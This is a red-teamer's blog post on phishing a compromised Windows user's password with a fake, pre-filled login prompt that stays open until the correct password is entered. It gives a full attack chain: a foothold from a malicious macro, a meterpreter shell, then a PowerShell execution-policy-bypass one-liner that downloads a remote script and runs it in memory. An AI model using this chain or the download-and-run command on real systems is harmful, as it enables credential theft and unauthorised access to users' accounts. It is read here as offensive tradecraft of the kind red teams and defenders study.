original_txt: Phishing for Credentials: If you want it, just ask! | enigma0x3 Red Teamer and Security Addict enigma0x3 Post navigation \xc2\xab Persistence using Microsoft\xc2 Outlook Using Alternate Data Streams to Persist on a Compromised\xc2 Machine \xc2\xbb Phishing for Credentials: If you want it, just\xc2 ask! January 21, 2015 by enigma0x3 **Update** I have updated the script so it checks for credential validation. The prompt will not close until the user enters the correct password. Once validated, it will display the password for you. Today, I was playing with Invoke-Mimikatz, which was created by @JosephBialek, which takes Mimikatz (created by @gentilkiwi) and loads it into memory.\xc2 I absolutely LOVE this tool, but I get sad when I don\xe2\x80\x99t have admin rights on the box and I don\xe2\x80\x99t want to touch disk. If all you are after are the current user\xe2\x80\x99s credentials (for email, vpn, network access), you can use this method. I initially thought of this after reading a report by FireEye regarding FIN4\xe2\x80\x99s method of invoking an outlook login prompt when the macro is ran. You can find this report here You can find my\xc2 code here: https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1 Basically, you compromise a machine using a malicious VBA macro or some sort of other vector. Once you have access to this machine, drop to a shell by typing \xe2\x80\x9cShell\xe2\x80\x9d at the meterpreter prompt. \xc2 From there, you can run the following command: powershell.exe -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString(\xe2\x80\x98URL_To_Invoke-LoginPrompt\xe2\x80\x99)); Invoke-LoginPrompt *When you add the URL to the Invoke-LoginPrompt script, make sure you use the \xe2\x80\x9cRaw\xe2\x80\x9d version on github or host your own* \xc2 When this runs, the user will get a prompt that is pre-populated with their domain and username. \xc2 When the user enters their password, it will return it to you with the domain and the user\xe2\x80\x99s username: \xc2 From there, you can now login to whatever resources you want as that user. \xc2 \xc2 \xc2 Thanks, Matt N. I\xe2\x80\x99ve come across this situation a few times and always had to somehow elevate to SYSTEM or local admin to get hashes/clear-text passes out.
